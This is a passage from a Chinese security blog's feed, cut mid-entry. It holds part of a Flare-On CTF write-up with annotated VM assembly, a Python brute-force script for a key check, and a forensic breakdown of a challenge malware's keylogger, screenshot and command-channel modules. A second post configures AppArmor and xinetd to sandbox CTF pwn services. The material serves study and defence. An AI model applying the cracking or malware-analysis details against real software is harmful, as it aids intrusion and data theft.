ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (&#96;ptr[20]^(ptr[20] &amp; ptr[18]) + i1</span><br><span class="line">;vpaddb ptr[7] , ptr[8] , ptr[7]add 0</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line">vpshufb ptr[7] , ptr[5] , ptr[7]7 &#x3D; i2 &gt;&gt; 4  and 6     5 shuf 7</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddb ptr[2] , ptr[1] , ptr[7]2 &#x3D; 1 + 7   (7 &#x3D; i2 &lt;&lt; 4  and 6       5 shuf 7)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[21] , ptr[18]~ptr[21]^(ptr[21] &amp; ptr[18])</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[21] , ptr[15] , ptr[0]~ptr[21]^(ptr[21] &amp; ptr[18]) + (17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)  +  i1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[21]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddubsw ptr[7] , ptr[2] , ptr[10]     2 *+  10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[22] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[22]^(ptr[22] &amp; ptr[18])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[22] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[22]^(ptr[22] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[22]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddwd ptr[2] , ptr[7] , ptr[11]7 *+ 11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[23] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[23] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[23]^(ptr[23] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[23]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[24] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[24] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[24]^(ptr[24] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[24]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[25] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[25] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[25]^(ptr[25] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[25]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpshufb ptr[2] , ptr[2] , ptr[12]2 shuf 12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[26] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[26] , ptr[15] , ptr[0]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1)</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[26]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line"></span><br><span class="line">vpermd ptr[2] , ptr[2] , ptr[13]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[27] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[27] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[27] , ptr[15] , ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[27]^(ptr[27] &amp; ptr[18]) + p1) </span><br><span class="line">;vpxor ptr[29] , ptr[27] , ptr[28]</span><br><span class="line">;vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[27]</span><br><span class="line"></span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vpand ptr[20] , ptr[20] , ptr[19]</span><br><span class="line">vmovdqu_mm ptr[31] , 0x2176620C3A5C0F290B583618734F07102E332623780E59150C05172D4B1B1E22</span><br></pre></td></tr></table></figure><p>输入参命令行参数传递。两个参数，第一个参数 9字节，程序中是明文校验。第二个参数32字节，通过反解VM代码获得的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">table &#x3D; map(ord,string.letters+string.digits)</span><br><span class="line">def crack(check):</span><br><span class="line">  t &#x3D; [0x00, 0x10, 0x13, 0x04, 0xBF, 0xBF, 0xB9, 0xB9]</span><br><span class="line">  for a in table:</span><br><span class="line">    for b in table:</span><br><span class="line">      for c in table:</span><br><span class="line">        for d in table:</span><br><span class="line">          a1 &#x3D; (t[a&gt;&gt;4]+a)&amp;0xff</span><br><span class="line">          b1 &#x3D; (t[b&gt;&gt;4]+b)&amp;0xff</span><br><span class="line">          c1 &#x3D; (t[c&gt;&gt;4]+c)&amp;0xff</span><br><span class="line">          d1 &#x3D; (t[d&gt;&gt;4]+d)&amp;0xff</span><br><span class="line">          if ((a1*0x40+b1)*0x1000+(c1*0x40+d1)) &amp;0xffffff &#x3D;&#x3D; check:</span><br><span class="line">            print &#39;&#39;.join(map(chr,[a,b,c,d]))</span><br><span class="line">            return</span><br><span class="line">  print &#39;nope&#39;</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">  for i in [0x7070b2,0xac01d2,0x5e610a,0xa72aa8,0x081c86,0x1ae845,0xc829b2,0xf3a11e]:</span><br><span class="line">    crack(i)</span><br><span class="line">  print &#39;end.&#39;</span><br></pre></td></tr></table></figure><h2 id="12-help"><a href="#12-help" class="headerlink" title="12 help"></a>12 help</h2><p>12题就比较蛋疼了…显示内存取证与流量分析</p><p>目说明中说环境crash了，直接windbg加载dmp文件，<code>!analyze -v</code>，原来是驱动man.sys导致的crash，把man.sys搞出来，PE头部已经丢了。里面还有个dll，根据调试信息是m.dll，而且发现其调试信息中的路径与man.sys类似，搜了下，内存里还加载过c.dll、n.dll、k.dll、s.dll、f.dll、driver1.sys。不过后面几个pe文件只有pe头部及小量的代码，大部分代码部分缺失。<br>根据调试信息及简单分析pe文件功能如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">drive1.sys   shellcode  \\??\FLSC</span><br><span class="line">man.sys id</span><br><span class="line">m.dll   cd   listen port 4444    \\.\FLID</span><br><span class="line">s.dll   screenshot</span><br><span class="line">n.dll   network</span><br><span class="line">f.dll   file</span><br><span class="line">c.dll   crypto</span><br><span class="line">k.dll   keylog</span><br></pre></td></tr></table></figure><p>简单看了下流量包，确定主控端ip为192.168.1.243，victim ip为192.168.1.244。<br>开始对比分析流量，发现端口4444,6666,7777,8888为之间通讯端口。4444端口为控制指令类数据，其它三个端口为victim向外传送的数据。网络包中的数据基本都加了一层异或处理，可以从4444端口的对比发现，6666及8888之间同一数据发两次，一次加了异或，一次没加，7777端口数据包较多，中间夹杂没加异或的数据包。</p><p>通过4444端口信息很简单就能解了最外层的异或。前4字节是数据长度，然后是4字节的指令，其它部分功能未知，应该是4字节+4字节+4字节子数据长度+子数据+unknow的结构。<br>有了外层数据包的编码方式，7777端口的数据就好解了，原来是bmp图片数据，去掉其中的未编码的数据，将<code>\r\n</code>替换成<code>\n</code>，然后将数据包分成各文件，根据异或值，填充下缺失的个别字节，然后解码去掉表示长度的4字节，图片就解码好了。图片是屏幕截图，有些操作命令行的，有些web浏览器的，最主要是打开keepass的操作，最后的图如下：</p><p>加图<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp"></a></p><p>根据图片内容，flag就在keepass的密码项中了。</p><p>又看了下其它的网络包，4444端口还发送了个文件和keepass的数据库名，文件应该就是上面说的driver1.sys，keepass数据库名应该是查找文件路径。<br>6666端口应该是发送keepass的数据库文件。</p><p>当时做题时漏了8888端口。于是开始开始在dmp文件中找keepass的信息，找到了数据库文件内容及加密过的masterkey和transfer_masterkey和对应的sessoion_key。于是乎就想办法解码原始key，看了keepass的源码，拿到了当前用户的masterkey，开始研究DPAPI。最后发现keepass的内存加密用了<code>CRYPTPROTECTMEMORY_SAME_PROCESS</code>标志，加入了进程信息，然后并不知参与加密的进程信息是什么，陷入僵局。</p><p>重新理思路，感觉应该漏了什么，通过<code>volatility</code>查看网络连接情况，发现漏了8888端口。此端口传送键盘记录信息，解了最外层的异或，子数据包并未能完全解码。子数据包编码方式与6666端口一致，通过keepass的数据文件内容，尝试异或解码，只解码部分数据，似乎编码加入了反馈机制。8888端口最后传送的就是keepass打开数据库时的键盘记录，传送的数据中可以正确解码标题部分<code>Open Database - keys.kdb</code>。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="reverse" scheme="https://bestwing.me/tags/reverse/"/>
    
    <category term="flare-on" scheme="https://bestwing.me/tags/flare-on/"/>
    
  </entry>
  
  <entry>
    <title>在CTF Pwn下使用AppArmor做权限隔离</title>
    <link href="https://bestwing.me/AppArmor-Pwn-Env.html"/>
    <id>https://bestwing.me/AppArmor-Pwn-Env.html</id>
    <published>2019-08-21T16:00:00.000Z</published>
    <updated>2019-10-28T13:30:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>最近接触了下AppArmor以及刚好最近部署某比赛，突然不想用docker做权限隔离，所以做了个记录</p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>sudo apt-get install apparmor-profiles apparmor-utils</code></p><h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>在生成配置文件前，需要做个软连接，因为aa-autodep是通过Path去寻找目标程序的。所以我这里先</p><p><code>sudo ln -s /home/binfile /usr/local/bin/binfile</code></p><p>然后..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apparmor.d/</span><br><span class="line">sudo aa-autodep binfile</span><br></pre></td></tr></table></figure><p>此刻 /etc/apparmor.d 目录下就会生成一个 home.binfile 的文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 18:49:37 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;binfile flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;home&#x2F;binfile mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="切换为-Complain-模式"><a href="#切换为-Complain-模式" class="headerlink" title="切换为 Complain 模式"></a>切换为 Complain 模式</h3><p><code>sudo aa-complain home.binaryname</code></p><p>紧接着正常运行程序以及exploit</p><h3 id="配置规则"><a href="#配置规则" class="headerlink" title="配置规则"></a>配置规则</h3><p>用<code>sudo aa-logprof</code> 生成记录运行过程中的正常日志</p><p>生成的规则如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 19:39:38 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;bin&#x2F;dash cx -&gt; &#x2F;bin&#x2F;dash,</span><br><span class="line">  &#x2F;bin&#x2F;dash mr,</span><br><span class="line">  &#x2F;home&#x2F;hub mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  profile &#x2F;bin&#x2F;dash flags&#x3D;(complain) &#123;</span><br><span class="line">    #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">    &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">    &#x2F;bin&#x2F;dash mr,</span><br><span class="line">    &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">    &#x2F;home&#x2F; r,</span><br><span class="line">    &#x2F;home&#x2F;* r,</span><br><span class="line">    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于自动生成配置文件并不是那么完美，因此我们要手动修改。</p><ol><li>由于远程需要，需要加上network inet stream</li><li>我仅仅需要读取 flag，因此需要修改可读文件目录</li></ol><p>最后修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  network inet stream,</span><br><span class="line">&#x2F;bin&#x2F;dash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;bash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">  &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;id mrix,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line">  &#x2F;tmp&#x2F;server mr,</span><br><span class="line">  &#x2F;tmp&#x2F; r,</span><br><span class="line">  &#x2F;tmp&#x2F;flag r,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ^&#x2F;bin&#x2F;bash &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当修改完配置文件，我们需要将它导入内核使用：</p><p><code>apparmor_parser -r /etc/apparmor.d/home.hub</code></p><p>或者</p><p><code>aa-enforce /etc/apparmor.d/home.hub</code></p><p>其实说来这个配置文件就是一个白名单，意味着如果一些内容多写进到白名单里，可能会造成权限配置不当。</p><h2 id="与xinetd-合用"><a href="#与xinetd-合用" class="headerlink" title="与xinetd 合用"></a>与xinetd 合用</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>由于用来配置 ctf pwn,所以我们还需一个守护进程，这里我选择xinetd，配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">service pwn_server</span><br><span class="line">&#123;</span><br><span class="line">socket_type &#x3D; stream</span><br><span class="line">protocol &#x3D; tcp</span><br><span class="line">user &#x3D; root</span><br><span class="line">group &#x3D; root</span><br><span class="line">server &#x3D; &#x2F;home&#x2F;limit.sh</span><br><span class="line">wait &#x3D; no</span><br><span class="line">per_source &#x3D; 50</span><br><span class="line">banner &#x3D; &#x2F;home&#x2F;banner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>limit.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">ulimit -u 10000</span><br><span class="line">ulimit -c 0</span><br><span class="line">ulimit -v 7340032</span><br><span class="line">/home/hub</span><br></pre></td></tr></table></figure><p>并在 <strong>/etc/services</strong> 加上相应的服务名称与端口，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn_server      12435&#x2F;tcp</span><br><span class="line">tcpmux          1&#x2F;tcp                           # TCP port service multiplexer</span><br><span class="line">echo            7&#x2F;tcp</span><br><span class="line">echo            7&#x2F;udp</span><br></pre></td></tr></table></figure><p>最后 service xinetd start 启动即可。 </p><p>冲！XD</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Other" scheme="https://bestwing.me/categories/Other/"/>
    
    
    <category term="AppArmor" scheme="https://bestwing.me/tags/AppArmor/"/>
    
  </entry>
  
  <entry>
    <title>一个脱 themida 强壳的特殊方法</title>
    <link href="https://bestwing.me/easy-way-to-unpacking-theminda2.x.html"/>
    <id>https://bestwing.me/easy-way-to-unpacking-theminda2.x.html</id>
    <published>2019-05-08T16:00:00.000Z</published>
    <updated>2020-03-04T05:35:44.000Z</updated>
    
